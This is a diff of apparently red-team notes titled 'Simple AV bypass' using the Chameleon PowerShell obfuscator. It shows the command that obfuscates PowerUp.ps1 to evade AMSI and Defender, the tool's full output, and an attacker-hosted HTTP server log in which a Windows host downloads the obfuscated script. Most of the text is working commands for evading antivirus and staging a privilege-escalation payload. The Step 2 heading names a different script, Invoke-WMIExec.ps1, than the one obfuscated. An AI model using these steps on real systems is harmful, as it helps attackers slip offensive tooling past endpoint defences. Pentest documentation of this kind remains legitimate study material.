@@ -1,5 +1,5 @@
 =========================================================================================================================================================
-Simple AV bypass using the PowerShell obfuscation script 'Chameleon'
+Simple AV bypass using the PowerShell obfuscation script 'Chameleon.py'
 =========================================================================================================================================================
 
 Chameleon is yet another PowerShell obfuscation tool designed to bypass AMSI and commercial antivirus solutions.
@@ -27,38 +27,46 @@ PoC - Example with the script 'PowerUp.ps1' running on a Windows 10 laptop (full
 Step 1 - Obfuscate the script  'PowerUp.ps1' with Chameleon.py on a Kali VM
 ----------------------------------------------------------------------------------
 
-jeff@kali:~/Documents/Tools/chameleon-main$ python3 ./chameleon.py -a ./powerup.ps1 -o ./chameleon-powerup.ps1
+jeff@kali:~/Documents/Tools/chameleon-main$ python3 ./chameleon.py -K jeff -l 5 -a ./powerup.ps1 -o ./chameleon-p0w3rup1.ps1 --decimal
 sh: 1: color: not found
 __________________________________________________________________________________
-    
-  ▒▒▒▒▒▒  ▒▒   ▒▒  ▒▒▒▒▒  ▒▒▒    ▒▒▒ ▒▒▒▒▒▒▒ ▒▒     ▒▒▒▒▒▒▒  ▒▒▒▒▒  ▒▒▒  ▒▒  ▒▒▒
-  ▒▒      ▒▒   ▒▒ ▒▒   ▒▒ ▒▒▒▒  ▒▒▒▒ ▒▒      ▒▒     ▒▒      ▒▒   ▒▒ ▒▒▒▒ ▒▒ ▒▒▒▒
-  ▓▓      ▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓ ▓▓ ▓▓▓▓ ▓▓ ▓▓▓▓▓   ▓▓     ▓▓▓▓▓   ▓▓   ▓▓ ▓▓ ▓▓▓▓   ▓▓
-  ██      ██   ██ ██   ██ ██  ██  ██ ██      ██     ██      ██   ██ ██  ███   ██
-  ██████  ██   ██ ██   ██ ██      ██ ███████ ██████ ███████  █████  ██   ██   ██
-----------------------------------------------------------------------------------
-▒ by d3adc0de (@klezVirus)
-__________________________________________________________________________________
-
-[+] Starting obfuscation at 2022-12-12 23:41:19.257577
-  [*] Zeroing out comments... Done
-[+] Chameleon: standard obfuscation
-  [*] Identifying scoped variables and reflective constructors
-    [>] Generating function mapping... Success
-    [>] Identified 67 scoped variables which will not be obfuscated
-  [*] Variables Obfuscation... Done
-  [*] Data Types Obfuscation... Done
-  [*] Function Obfuscation... Done
-  [*] Nishang Obfuscation... Done
-  [*] Cases randomization... Done
-  [*] IP Address to Hex... Done                                                                                                 
-  [*] Comments Obfuscation... Done                                                                                              
-  [*] Indentation Randomization... Done                                                                                         
-  [*] Strings Obfuscation... Done                                                                                               
-[+] Chameleon: obfuscation via encoding                                                                                                            
-  [*] Writing obfuscated payload to ./chameleon-powerup.ps1... Done                                                                                
-[+] Ended obfuscation at 2022-12-12 23:41:32.871769
+                                                                                                                                                                                                                                           
+  ▒▒▒▒▒▒  ▒▒   ▒▒  ▒▒▒▒▒  ▒▒▒    ▒▒▒ ▒▒▒▒▒▒▒ ▒▒     ▒▒▒▒▒▒▒  ▒▒▒▒▒  ▒▒▒  ▒▒  ▒▒▒                                                                                                                                                           
+  ▒▒      ▒▒   ▒▒ ▒▒   ▒▒ ▒▒▒▒  ▒▒▒▒ ▒▒      ▒▒     ▒▒      ▒▒   ▒▒ ▒▒▒▒ ▒▒ ▒▒▒▒                                                                                                                                                           
+  ▓▓      ▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓ ▓▓ ▓▓▓▓ ▓▓ ▓▓▓▓▓   ▓▓     ▓▓▓▓▓   ▓▓   ▓▓ ▓▓ ▓▓▓▓   ▓▓                                                                                                                                                           
+  ██      ██   ██ ██   ██ ██  ██  ██ ██      ██     ██      ██   ██ ██  ███   ██                                                                                                                                                           
+  ██████  ██   ██ ██   ██ ██      ██ ███████ ██████ ███████  █████  ██   ██   ██                                                                                                                                                           
+----------------------------------------------------------------------------------                                                                                                                                                         
+▒ by d3adc0de (@klezVirus)                                                                                                                                                                                                                 
+__________________________________________________________________________________                                                                                                                                                         
+                                                                                                                                                                                                                                           
+[+] Starting obfuscation at 2022-12-13 00:10:47.751341                                                                                                                                                                                     
+  [*] Zeroing out comments... Done                                                                                                                                                                                                         
+[+] Chameleon: standard obfuscation                                                                                                                                                                                                        
+  [*] Identifying scoped variables and reflective constructors                                                                                                                                                                             
+    [>] Generating function mapping... Success                                                                                                                                                                                             
+    [>] Identified 67 scoped variables which will not be obfuscated                                                                                                                                                                        
+  [*] Variables Obfuscation... Done                                                                                                                                                                                                        
+  [*] Data Types Obfuscation... Done                                                                                                                                                                                                       
+  [*] Function Obfuscation... Done                                                                                                                                                                                                         
+  [*] Nishang Obfuscation... Done                                                                                                                                                                                                          
+  [*] Cases randomization... Done                                                                                                                                                                                                          
+  [*] IP Address to Hex... Done                                                                                                                                                                                                            
+  [*] Comments Obfuscation... Done                                                                                                                                                                                                         
+  [*] Indentation Randomization... Done                                                                                                                                                                                                    
+  [*] Strings Obfuscation... Done                                                                                                                                                                                                          
+[+] Chameleon: obfuscation via encoding                                                                                                                                                                                                    
+  [*] Converting to decimal... Done                                                                                                                                                                                                        
+  [*] Writing obfuscated payload to ./chameleon-p0w3rup1.ps1... Done                                                                                                                                                                       
+[+] Ended obfuscation at 2022-12-13 00:10:55.818079      
 
 
 Step 2 - Check that the obfuscated 'Invoke-WMIExec.ps1' is working properly without being detected by the AMSI / Defender AV
 -----------------------------------------------------------------------------------------------------------------------------
+
+jeff@kali:~/Documents/Tools/chameleon-main$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+192.168.1.113 - - [13/Dec/2022 01:11:14] "GET / HTTP/1.1" 200 -
+192.168.1.113 - - [13/Dec/2022 01:11:16] "GET / HTTP/1.1" 200 -
+192.168.1.113 - - [13/Dec/2022 01:11:19] "GET /chameleon-p0w3rup1.ps1 HTTP/1.1" 200 -
+
